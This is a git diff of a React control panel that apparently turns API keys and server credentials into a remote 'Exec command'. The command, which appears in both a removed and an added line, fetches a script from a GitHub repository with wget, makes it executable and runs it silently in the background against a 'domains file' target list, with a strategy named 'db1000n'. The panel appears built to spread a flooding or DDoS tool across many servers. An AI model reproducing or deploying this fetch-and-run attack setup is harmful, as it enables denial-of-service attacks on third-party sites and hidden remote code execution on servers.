@@ -31,7 +31,6 @@ function App() {
   const $login = useRef();
   const $password = useRef();
   const $exec = useRef();
-  const $domainsURL = useRef();
   const [state, setState] = useState({
     perf: []
   })
@@ -42,7 +41,7 @@ function App() {
     password: ''
   })
   const [loadingState, setLoadingState] = useState({})
-  const [strategy, setStrategy] = useState('db1000n')
+  const [strategy, setStrategy] = useState('custom')
   const [domainsURL, setDomainsURL] = useState("https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/list.txt")
 
   const setLoading = (apiKey, loading) => {
@@ -141,6 +140,7 @@ function App() {
       //   bottom: -15,
       // },
     },
+
     animation: {
       duration: 0,
     },
@@ -419,15 +419,15 @@ function App() {
           <div className="col">
             <h4>Strategy</h4>
             <div className="form-check form-check-inline">
-              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('db1000n')} checked={strategy === 'db1000n'}/>
-              <label className="form-check-label" htmlFor="flexRadioDefault2">
-                DB1000N
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')} checked={strategy === 'custom'}/>
+              <label className="form-check-label" htmlFor="flexRadioDefault1">
+                Custom
               </label>
             </div>
             <div className="form-check form-check-inline">
-              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')}/>
-              <label className="form-check-label" htmlFor="flexRadioDefault1">
-                Custom
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('db1000n')} />
+              <label className="form-check-label" htmlFor="flexRadioDefault2">
+                DB1000N
               </label>
             </div>
           </div>
@@ -435,13 +435,13 @@ function App() {
         {strategy === 'custom' && <div className="row my-2">
           <div className="col">
             <h5>Domains file URL</h5>
-            <input type="text" className="form-control mb-1" value={domainsURL} onChange={e => setDomainsURL(e.target.value)}/>
+            <input type="text" className="form-control mb-1" value={domainsURL} onChange={e => setDomainsURL(e.target.value)} />
           </div>
         </div>}
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => {}} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/'+ (strategy === 'custom' ? 'custom' : 'db1000n') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f '+domainsURL+' >/dev/null 2>&1 &'} />
+            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => { }} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/' + (strategy === 'custom' ? 'custom' : 'db1000n') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'} />
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
